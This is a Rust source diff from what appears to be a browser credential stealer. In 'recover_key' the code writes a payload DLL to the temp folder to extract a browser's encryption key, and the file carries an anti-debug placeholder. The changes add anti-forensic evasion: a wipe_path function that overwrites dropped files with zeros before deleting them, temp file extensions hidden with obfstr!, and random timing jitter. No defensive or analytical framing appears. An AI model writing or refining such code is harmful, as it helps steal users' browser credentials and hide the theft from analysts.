@@ -90,6 +90,15 @@ fn pause_ms(min: u64, max: u64) {
     thread::sleep(Duration::from_millis(jitter_ms(min, max)));
 }
 
+fn wipe_path(path: &Path) {
+    if let Ok(meta) = fs::metadata(path) {
+        let len = meta.len().min(16 * 1024 * 1024) as usize;
+        if len > 0 {
+            let _ = fs::write(path, vec![0u8; len]);
+        }
+    }
+    let _ = fs::remove_file(path);
+}
 
 fn host_under_analysis() -> bool {
     // Placeholder for indirect syscall anti-debug checks
@@ -175,7 +184,7 @@ impl Drop for TempGuard {
         pause_ms(40, 220);
 
         for path in &self.files {
-            let _ = fs::remove_file(path);
+            wipe_path(path);
             pause_ms(15, 85);
         }
         for path in &self.dirs {
@@ -740,9 +749,9 @@ pub fn recover_key(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
 
     let tag = ctx_id();
     let temp = env::temp_dir();
-    let dll_path = temp.join(format!("{tag}.tmp"));
-    let result_path = temp.join(format!("{tag}.json"));
-    let profile_dir = temp.join(format!("{tag}_p"));
+    let dll_path = temp.join(format!("{tag}{}", obfstr!(".tmp")));
+    let result_path = temp.join(format!("{tag}{}", obfstr!(".dat")));
+    let profile_dir = temp.join(format!("{tag}{}", obfstr!(".cache")));
 
     let mut guard = TempGuard::new();
     guard.track_file(dll_path.clone());
@@ -750,6 +759,7 @@ pub fn recover_key(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
     guard.track_dir(profile_dir.clone());
 
     fs::write(&dll_path, payload_dll).ok()?;
+    pause_ms(30, 120);
 
     let result_key = env_key_result();
     let user_data_key = env_key_user_data();
